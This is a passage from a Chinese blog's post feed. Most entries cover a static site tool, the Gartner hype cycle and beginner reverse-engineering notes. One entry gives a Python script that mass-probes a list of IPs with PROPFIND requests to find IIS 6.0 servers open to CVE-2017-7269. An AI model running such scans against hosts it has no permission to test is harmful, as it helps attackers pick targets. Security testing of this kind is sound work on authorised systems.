<li>WDTP还有极具实用价值的“复习/提醒”功能，文档隐身功能，文档缩略语功能和极其强悍的“智库”架构。<br>其他更多……</li>
</ul>
<p>在“笔记、写书、建站/博客、前端开发”这几个方面，WDTP（山湖录）无缝集成，一键切换。即：同一套内容，随时可生成上述任何一种类型，还可多种类型混合使用。</p>
<p><strong>程序采用c++语言编写，作者同时也是我十分敬重的一位程序员，如果想查看更多信息请访问他的<a href="http://underwaysoft.com/works/wdtp/index.html" target="_blank" rel="noopener">项目主页</a>程序开源<a href="https://github.com/LegendRhine/WDTP" target="_blank" rel="noopener">github地址</a></strong></p>
<h2 id="上手使用"><a href="#上手使用" class="headerlink" title="上手使用"></a>上手使用</h2><p>本来想说更多的，但是确实这款软件和其他的静态博客生成器不一样，拥有着方便的界面，支持english和中文，设置里面即可切换，相信只要你使用过，你就会使用它，能感受到他的方便快捷，如果想看更多玩法和说明请查看<a href="http://underwaysoft.com/works/wdtp/index.html" target="_blank" rel="noopener">项目主页</a>，现在只支持两种模板book(用来作为笔记)和blog(用来生成静态博客)，不过作者说会逐渐增加主题，真的除了暂时主题匮乏之外(会前端的可以自己改改主题)，其他的功能相比于其他的静态博客生成器方便得不是一丁半点</p>
<p><strong>那么生成静态文件之后如何上传到自己的vps或者github pages或者coding pages呢？</strong></p>
<h3 id="上传到vps"><a href="#上传到vps" class="headerlink" title="上传到vps"></a>上传到vps</h3><p>这个你可以使用常规的FTP或者Rsync或者其他方法上传，不过我推荐自己的做法(使用Resilio Sync)<br>如果你的服务器是windows那么你只需要去<a href="https://www.resilio.com/individuals/" target="_blank" rel="noopener">Resilio Sync官网</a>下载，建议安装为服务，然后访问本机sync服务的网址，点击右上角添加文件夹添加你的网站根目录，然后复制读写key，本机安装Resilio sync客户端然后手动连接这个key到你的静态文件目录，具体可以查资料，这个不难<br>如果你的服务器是Linux，可以查看Resilio Sync网站上面的<a href="https://help.getsync.com/hc/en-us/articles/206178924" target="_blank" rel="noopener">How to install Sync Package on Linux</a>，说明比较详细，安装好之后和上面的步骤一样，然后只要你本机挂着resilio sync软件，生成就可以即时同步。<br>trust me， 你将找到这个软件(Resilio Sync)更多的玩法，这软件之前的名字是btsync<br>当然，这只是我自己使用的方法，你也可以使用其他方法<br>至于上传到github pages或者coding pages，这个你需要会用git，进入静态文件目录，然后bash下执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit //命令给文件一个仓库标记，做为仓库历史，便于以后在远程端查找</span><br><span class="line">git remote add origin git@github.com:username/username.github.io.git</span><br></pre></td></tr></table></figure></p>
<p><a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:username/username.github.io.git的是你的git远端地址，至于为什么用这个是因为ssh创建公钥之后不用重复输入密码<br><strong>注: </strong><a href="https://coding.net/help/doc/account/ssh-key.html" target="_blank" rel="noopener">如何生成ssh公钥</a>这篇文章是以coding.net为例，不过你生成的id_rsa.pub内容同时也可以添加到github，基本相同的步骤，如果有什么疑问可以百度一下关键词为<code>github ssh公钥 配置</code></p>
<h3 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a>添加评论功能</h3><ul>
<li>如果你不愿意麻烦可以使用邮箱来收集评论<br>打开qq邮箱点击上方<strong>设置-&gt;账户-&gt;邮我-&gt;使用邮我</strong><br>然后获取代码<br><img src="https://ooo.0o0.ooo/2017/04/01/58df97595ea80.png" alt="snipaste_20170401_200420.png"><br>复制<code>&lt;a target=&quot;_blank&quot; href=&quot;http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=64qAgJ6GioWYq5qaxYiEhg&quot; style=&quot;text-decoration:none;&quot;&gt;</code><br>然后打开你的项目文件夹/themes/blog/article.html，把相应的地方改为下面例子这样<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">page_navi</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">"http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=64qAgJ6GioWYq5qaxYiEhg"</span> <span class="attr">style</span>=<span class="string">"text-decoration:none;"</span>&gt;</span>评论/咨询/讨论/留言<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>然后别人点击评论就可以打开给你发邮件的入口</p>
<ul>
<li>如果你想添加社会化评论系统<br>鉴于多说即将关闭，国内没被墙的无需北岸的第三方评论已经很少了，这里我用<a href="https://livere.com" target="_blank" rel="noopener">来必力</a>做例子</li>
</ul>
<ol>
<li>注册登录(如果chrome浏览器注册之后一直登录不了请使用火狐)</li>
<li>点击顶栏安装，然后填好相关信息获取代码<br><img src="https://ooo.0o0.ooo/2017/04/01/58df9a0fc3eb5.png" alt="snipaste_20170401_201601.png"></li>
<li><p>然后打开你的项目文件夹/themes/blog/article.html，把原先的评论代码删除掉，在合适的地方插入上方代码，我插入完之后的article.html例子如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Generator"</span> <span class="attr">content</span>=<span class="string">"WDTP by UnderwaySoft"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Author"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;author&#125;&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Keywords"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;keywords&#125;&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Description"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;description&#125;&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"&#123;&#123;siteRelativeRootPath&#125;&#125;add-in/style.css"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span> </span><br><span class="line">  &#123;&#123;siteLogo&#125;&#125;</span><br><span class="line">  &#123;&#123;siteMenu&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">  &#123;&#123;siteNavi&#125;&#125;</span><br><span class="line">  &#123;&#123;content&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">  &#123;&#123;createAndModifyTime&#125;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span><span class="tag">&lt;<span class="name">h5</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"background:PowderBlue"</span>&gt;</span></span><br><span class="line">	    本文版权：&#123;&#123;siteLink&#125;&#125; &amp;emsp;</span><br><span class="line">		共享协议：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://creativecommons.org/licenses/by-nc-nd/2.5/deed.zh'</span> <span class="attr">target</span>=<span class="string">'_blank'</span>&gt;</span>署名-非商业使用-禁止演绎<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">  &#123;&#123;previousAndNext&#125;&#125;</span><br><span class="line"></span><br><span class="line">  &#123;&#123;ad&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  &#123;&#123;random&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 来必力City版安装代码 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lv-container"</span> <span class="attr">data-id</span>=<span class="string">"city"</span> <span class="attr">data-uid</span>=<span class="string">"MTAyMC8yODAwMC80NTc3"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">			(function(d, s) &#123;</span></span><br><span class="line"><span class="undefined">				var j, e = d.getElementsByTagName(s)[0];</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">				if (typeof LivereTower === 'function') &#123; return; &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">				j = d.createElement(s);</span></span><br><span class="line"><span class="undefined">				j.src = 'https://cdn-city.livere.com/js/embed.dist.js';</span></span><br><span class="line"><span class="undefined">				j.async = true;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">				e.parentNode.insertBefore(j, e);</span></span><br><span class="line"><span class="undefined">			&#125;)(document, 'script');</span></span><br><span class="line"><span class="undefined">		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">noscript</span>&gt;</span> 为正常使用来必力评论功能请激活JavaScript<span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- City版安装代码已完成 --&gt;</span></span><br><span class="line">  &#123;&#123;contact&#125;&#125;</span><br><span class="line">  &#123;&#123;bottomCopyright&#125;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>最后的效果如图<br><img src="https://ooo.0o0.ooo/2017/04/01/58df9adb69d5f.png" alt="snipaste_20170401_201926.png"></p>
</li>
</ol>
<h3 id="最后要说的"><a href="#最后要说的" class="headerlink" title="最后要说的"></a>最后要说的</h3><p>这个工具确实是十分方便的，如果你作为笔记，可以使用坚果云来同步，同时它可以打包你的数据，多说无益，试用之后你会感受到它的强大</p>
<p><strong>本文部分转自<a href="http://underwaysoft.com/works/wdtp/download.html" target="_blank" rel="noopener">Underwaysoft</a></strong></p>
]]></content>
      <categories>
        <category>推荐向</category>
      </categories>
      <tags>
        <tag>推荐向</tag>
      </tags>
  </entry>
  <entry>
    <title>iis6-0 cve-2017-7269 批量验证脚本</title>
    <url>/2017/04/01/iis6-0-cve-2017-7269.html</url>
    <content><![CDATA[<p><a href="https://gist.githubusercontent.com/iam1980/62ee37e38c7f76ca5d3889379e1d81fd/raw/aed9a3ef42bc6e6592913c5df8906ca6c57c9c66/getpro.py" target="_blank" rel="noopener">代码地址</a></p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'ips.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">flines = f.readlines()</span><br><span class="line"></span><br><span class="line">vulnsrvs = <span class="number">0</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> flines:</span><br><span class="line"></span><br><span class="line">    host = line.split(<span class="string">":"</span>)</span><br><span class="line"></span><br><span class="line">    ip = host[<span class="number">0</span>].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">    port = host[<span class="number">1</span>].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Try ("</span> + str(i) +<span class="string">") "</span>+ str(ip) +<span class="string">":"</span> + str(port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> port == <span class="string">"443"</span>:</span><br><span class="line">        <span class="comment">#dont bother with SSL/TLS</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        myout =  subprocess.check_output([<span class="string">'curl'</span>, <span class="string">'--connect-timeout'</span>, <span class="string">'2'</span>, <span class="string">'--max-time'</span>, <span class="string">'2'</span>, <span class="string">'-s'</span>,<span class="string">'-I'</span>, <span class="string">'-X'</span>, <span class="string">'PROPFIND'</span>,<span class="string">'http://'</span> + ip  + <span class="string">':'</span> + port + <span class="string">'/'</span> ])</span><br><span class="line">        <span class="keyword">print</span> myout</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"HTTP/1.1 411 Length Required"</span> <span class="keyword">in</span> myout:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Found one:"</span></span><br><span class="line">            <span class="keyword">print</span> myout</span><br><span class="line">            vulnsrvs += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> str(e.output)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Vulnerable: "</span> + str(vulnsrvs)</span><br></pre></td></tr></table></figure>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>ips.txt 是待验证的列表格式为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">129.112.44.1:80</span><br><span class="line">129.112.44.2:81</span><br><span class="line">129.112.44.43:8808</span><br></pre></td></tr></table></figure></p>
<p>它不检测443端口（HTTPS）<br>你也可以简单改一下进行网段批量验证。</p>
<p>转自群友<a href="http://www.loner.fm/article.php?id=24251" target="_blank" rel="noopener">CF_HB</a></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>推荐一个十分好看的开源博客系统</title>
    <url>/2017/03/12/a-beautiful-open-source-blog-lcm.html</url>
    <content><![CDATA[<p>推荐一个十分好看的开源博客系统，直接百度“里程密”地址<a href="http://www.lcm.wang/" target="_blank" rel="noopener">www.lcm.wang</a></p>
<p>附图</p>
<p>主页</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c53df6b41cf.png" alt="snipaste_20170312_202041.png"></p>
<p>后台</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c53e0b65eaa.png" alt="snipaste_20170312_201924.png"></p>
<p>浓浓的科技简约风，适合做技术的你</p>
]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>技术的热门度曲线</title>
    <url>/2017/03/12/technology-s-popularity-curve.html</url>
    <content><![CDATA[<p>全球最大的 IT 咨询公司<a href="http://baike.baidu.com/item/Gartner" target="_blank" rel="noopener">高德纳</a>（Gartner），有一个”<a href="http://www.gartner.com/technology/research/methodologies/hype-cycle.jsp" target="_blank" rel="noopener">技术热门度曲线</a>“模型（Gartner Hype Cycle）。</p>
<p>该模型认为，一门技术的发展要经历五个阶段。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4de8267e76.png" alt="bg2017030301.png"><br><a id="more"></a></p>
<ol>
<li><p><strong>启动期（Innovation Trigger）</strong><br>该技术刚刚诞生，还只是一个概念，不具有可用性，无法评估商业潜力。媒体有所报道，引起了外界的兴趣。</p>
</li>
<li><p><strong>泡沫期（Peak of Inflated Expectations）</strong><br>该技术逐步成型，出现了个别成功的案例，一些激进的公司开始跟进。媒体开始大肆报导，伴有各种非理性的渲染，产品的知名度达到高峰。</p>
</li>
<li><p><strong>低谷期（Trough of Disillusionment）</strong><br>该技术的局限和缺点逐步暴露，对它的兴趣开始减弱。基于它的产品，大部分被市场淘汰或者失败，只有那些找到早期用户的公司艰难地活了下来。媒体对它的报道逐步冷却，前景不明。</p>
</li>
<li><p><strong>爬升期（Slope of Enlightenment）</strong><br>该技术的优缺点越来越明显，细节逐渐清晰，越来越多的人开始理解它。基于它的第二代和第三代产品出现，更多的企业开始尝试，可复制的成功使用模式出现。媒体重新认识它，业界这一次给予了高度的理性的关注。</p>
</li>
<li><p><strong>高原期（Plateau of Productivity）</strong><br>经过不断发展，该技术慢慢成为了主流。技术标准得到了清晰定义，使用起来越发方便好用，市场占有率越来越高，进入稳定应用阶段。配合它的工具和最佳实践，经过数代的演进，也变得非常成熟了。业界对它有了公认的一致的评价。</p>
</li>
</ol>
<p>该模型的细节可以查看维基百科的<a href="https://en.wikipedia.org/wiki/Hype_cycle#/media/File:Hype-Cycle-General.png" target="_blank" rel="noopener">大图</a>。</p>
<p>高德纳公司每年都会公布，当年的热门技术图。下面就是去年七月的图。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df3436d4e.png" alt="bg2017030302.png"></p>
<p>上图中，4D打印处于”启动期”，区块链处于”泡沫期”，增强现实处于”低谷期”，虚拟现实处于爬升期。</p>
<p>本周，有人进行数据分析后，建立了一个名叫 <a href="https://stateofdev.com/" target="_blank" rel="noopener">State.of.Dev</a> 的网站，提供各种技术的热门程度图。</p>
<p>下图是编程语言。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df61bd060.png" alt="bg2017030303.png"></p>
<p>上图中，Rust 语言处于启动期，Go 语言处于泡沫期，Ruby 语言处于低谷期，Object-C 处于爬升期，PHP 和 Java 处于高原期。</p>
<p>下图是 Web 技术。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df7a78ea1.png" alt="bg2017030305.png"></p>
<p>上图中，WebAssembly 处于启动期，WebRTC 处于低谷期，HTTPS 处于高原期。</p>
<p>一门技术到底前景如何，很难预测，但是它的热门程度却是可以衡量的（比如在社交媒体提及次数的增长幅度）。风险投资跟热门程度高度正相关，越热门的技术越容易拿到投资。</p>
<p>用户可以采用这张图，判断技术处在哪一个阶段，确定它的热门程度。简单的使用规则如下。</p>
<blockquote>
<p><strong>“争取风险投资，要选择热门的技术；解决实际问题， 要选择可靠的技术。”</strong></p>
</blockquote>
<p>简单说，处于启动期的技术，风险很大，不确定性极高，但是一旦成功，回报可能也很高，适合创业公司；处于高原期的技术，非常可靠，风险低，有成熟的解决方案和配套工具，适合大公司和企业的内部应用。</p>
<p>反过来说，如果一门技术处于高原期了，就代表它非常成熟了，人们对它能干什么和不能干什么，都已经很了解了，也没有新的期待了，技术本身的潜力已经不大了，所以用它拿不到投资，只能用来干活。</p>
<p>（完）</p>
<p><strong>转载自<a href="http://www.ruanyifeng.com/blog/2017/03/gartner-hype-cycle.html" target="_blank" rel="noopener">阮一峰的网络日志</a></strong></p>
]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向学习笔记（2）-这是代码还是数据</title>
    <url>/2017/03/10/reverse-engineering-study-note-2-is-this-code-or-data.html</url>
    <content><![CDATA[<p><strong>以下的ide为CodeBlocks，编译器采用的GCC，系统为win10 64bit,在不同编译器和环境下汇编代码可能不同</strong><br><a id="more"></a></p>
<h1 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getmin</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(a&gt;b)</span><br><span class="line">		<span class="keyword">return</span> b;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*pfunction)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">456789</span>,b=<span class="number">123789</span>,c=<span class="number">0</span>;</span><br><span class="line">    pfunction pGetmin = (pfunction)getmin;</span><br><span class="line">	</span><br><span class="line">    c = pGetmin(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这段代码是比大小输出小的，<code>typedef int (*pfunction)(int, int);</code>定义了一个函数指针，但是下面这段代码和上面的功能是完全一样的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*pfunction)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">456789</span>,b=<span class="number">123789</span>,c=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> loc[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x55</span>, <span class="number">0x89</span>, <span class="number">0xE5</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x3B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0x7E</span>, <span class="number">0x05</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0xEB</span>, <span class="number">0x03</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    pfunction getmin = (pfunction)&amp;loc;</span><br><span class="line">    c = getmin(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h1><p>当<code>c = pGetmin(a, b);</code>调用pGetmin的时候，在汇编中是先call跳到一个地址然后从那个地址再jmp到函数入口地址然后开始执行函数<br>getmin函数整体汇编为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push   ebp</span><br><span class="line">mov    ebp,esp</span><br><span class="line">mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">cmp    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">jle    &lt;getmin+16&gt;</span><br><span class="line">mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">jmp    &lt;getmin+19&gt;</span><br><span class="line">mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">pop    ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p>
<p>通过一些调试程序（发现CodeBlocks带的汇编调试没有vc6好用，看不到硬编码）可以得出这段汇编代码在硬编码中的值为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x3B, 0x45, 0x0C, 0x7E, 0x05, 0x8B, 0x45, 0x0C, 0xEB, 0x03, 0x8B, 0x45, 0x08, 0x5D, 0xC3</span><br></pre></td></tr></table></figure></p>
<p>这段数据我们在第二个代码中把它存入了一个char类型的数组，它虽然在数据区，但是它还是可以看作可运行的一段函数代码，我们依旧定义一个函数指针指向这个char类型数组的入口地址，达到了和第一种相同的效果<br>在编程中，我们是把代码和数据分得很开的，但是在逆向和汇编中，这个区别就不明显了，在计算机中都是以数据形式存在的，你可以说它是一串数据，也可以说它是代码</p>
<p><strong><em>转载请注明出处</em></strong></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向学习笔记（1）-为什么代码不停地循环运行</title>
    <url>/2017/03/09/reverse-engineering-study-note-1-why-does-code-keep-running.html</url>
    <content><![CDATA[<p>对于下面这段c语言代码会一直不停地循环，为什么呢？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HelloWorld</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=<span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a[i] = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HelloWorld();</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>当你运行上面这串代码的时候，因为c语言并不会对数组越界进行检查，所以是不会报错可以直接运行的，那么是什么原因导致了下面这张图的结果呢？</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11551a36ea.gif" alt="GIF.gif"></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>我们可以调试跟进看看，在HelloWorld函数上加一个断点跟进去看看</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11956dee36.png" alt="snipaste_20170309_165830.png"></p>
<p>这个函数主要的汇编代码如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8:        int i = 0;</span><br><span class="line">00401038   mov         dword ptr [ebp-4],0</span><br><span class="line">9:        int a[] = &#123;1,2,3,4,5,6,7,8,9,10&#125;;</span><br><span class="line">0040103F   mov         dword ptr [ebp-2Ch],1</span><br><span class="line">00401046   mov         dword ptr [ebp-28h],2</span><br><span class="line">0040104D   mov         dword ptr [ebp-24h],3</span><br><span class="line">00401054   mov         dword ptr [ebp-20h],4</span><br><span class="line">0040105B   mov         dword ptr [ebp-1Ch],5</span><br><span class="line">00401062   mov         dword ptr [ebp-18h],6</span><br><span class="line">00401069   mov         dword ptr [ebp-14h],7</span><br><span class="line">00401070   mov         dword ptr [ebp-10h],8</span><br><span class="line">00401077   mov         dword ptr [ebp-0Ch],9</span><br><span class="line">0040107E   mov         dword ptr [ebp-8],0Ah</span><br><span class="line">10:       for(i=0; i&lt;=10; i++)</span><br><span class="line">00401085   mov         dword ptr [ebp-4],0</span><br><span class="line">0040108C   jmp         HelloWorld+77h (00401097)</span><br><span class="line">0040108E   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401091   add         eax,1</span><br><span class="line">00401094   mov         dword ptr [ebp-4],eax</span><br><span class="line">00401097   cmp         dword ptr [ebp-4],0Ah</span><br><span class="line">0040109B   jg          HelloWorld+97h (004010b7)</span><br><span class="line">11:       &#123;</span><br><span class="line">12:           a[i] = 0;</span><br><span class="line">0040109D   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">004010A0   mov         dword ptr [ebp+ecx*4-2Ch],0</span><br><span class="line">13:           printf(&quot;Hello World!\n&quot;);</span><br><span class="line">004010A8   push        offset string &quot;Hello World!\n&quot; 